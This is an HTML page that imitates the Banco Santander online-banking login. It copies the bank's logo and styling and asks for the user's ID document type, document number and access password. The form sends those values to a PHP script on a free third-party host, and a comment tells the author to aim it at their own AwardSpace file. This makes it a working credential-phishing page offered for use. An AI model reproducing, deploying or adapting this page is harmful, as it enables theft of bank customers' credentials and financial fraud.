<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicio de Sesión - Santander</title>
    <link rel="icon" href="https://logodownload.org/wp-content/uploads/2017/05/banco-santander-logo-30.png" type="image/png">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            background: url('https://images.unsplash.com/photo-1506748686214-e9df14d4d9d0') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            height: 100vh;
            padding: 10px;
            flex-direction: column;
        }
        .logo {
            position: relative;
            top: 10px;
            left: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        .logo img {
            width: 150px;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.9); /* Fondo blanco semitransparente */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
            margin: 0 auto;
        }
        .login-header {
            text-align: center;
            margin-bottom: 20px;
        }
        .login-header h1 {
            font-size: 1.5em;
            color: #000;
            margin: 0;
            font-weight: 700;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            font-size: 1em;
        }
        .form-group input, .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1em;
        }
        .form-group input:focus, .form-group select:focus {
            outline: none;
            border-color: #e60000;
            box-shadow: 0 0 4px rgba(230, 0, 0, 0.5);
        }
        .login-button {
            width: 100%;
            background: #e60000;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 4px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
        }
        .login-button:hover {
            background: #c40000;
        }
        .toggle-password {
            background: none;
            border: none;
            color: #e60000;
            cursor: pointer;
            font-size: 0.9em;
            padding: 0;
            text-decoration: underline;
        }
        .error {
            color: red;
            font-size: 0.9em;
            margin-top: 5px;
        }
        .success-message {
            color: green;
            font-size: 1em;
            margin-top: 20px;
            text-align: center;
            display: none;
        }
        @media (min-width: 768px) {
            body {
                flex-direction: row;
            }
            .logo {
                position: absolute;
                top: 20px;
                left: 20px;
            }
            .login-container {
                margin-right: 5%;
            }
        }
    </style>
</head>
<body>

    <div class="logo">
        <img src="https://logodownload.org/wp-content/uploads/2017/05/banco-santander-logo-1.png" alt="Santander">
    </div>

    <div class="login-container">
        <div class="login-header">
            <h1>Te damos la bienvenida a tu Banca Online</h1>
        </div>

        <!-- Aquí cambia el 'action' para apuntar a tu archivo PHP en AwardSpace -->
        <form id="loginForm" action="https://margaris97.atwebpages.com/procesar_login.php" method="POST" onsubmit="validateForm(event)">
            <div class="form-group">
                <label for="documentType">Tipo de documento</label>
                <select id="documentType" name="documentType" required>
                    <option value="NIF">NIF</option>
                    <option value="CIF">CIF</option>
                    <option value="NIE">NIE</option>
                    <option value="Pasaporte">Pasaporte</option>
                    <option value="Usuario">Usuario</option>
                </select>
            </div>

            <div class="form-group">
                <label for="documentNumber">Número de documento</label>
                <input type="text" id="documentNumber" name="documentNumber" required>
                <div id="documentError" class="error" style="display: none;">Debe introducir un documento válido.</div>
            </div>

            <div class="form-group">
                <label for="password">Clave de acceso</label>
                <input type="password" id="password" name="password" required>
                <button type="button" class="toggle-password" onclick="togglePassword()">Ver</button>
            </div>

            <div class="form-group">
                <button type="submit" class="login-button">Iniciar sesión</button>
            </div>
        </form>

        <div class="form-group">
            <a href="#" style="text-decoration: none; color: #e60000; font-weight: 500;">¿Olvidaste tu contraseña?</a>
        </div>
    </div>

</body>
</html>


